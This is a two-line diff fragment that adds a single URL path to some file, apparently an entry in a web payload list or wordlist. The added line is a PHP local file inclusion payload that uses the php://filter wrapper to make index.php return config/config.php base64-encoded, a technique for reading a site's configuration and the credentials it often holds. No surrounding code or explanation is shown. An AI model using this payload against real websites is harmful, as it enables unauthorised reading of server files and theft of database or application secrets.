@@ -1,0 +1,2 @@
+/index.php?lang=php://filter/convert.base64-encode/resource=config/config.php
+
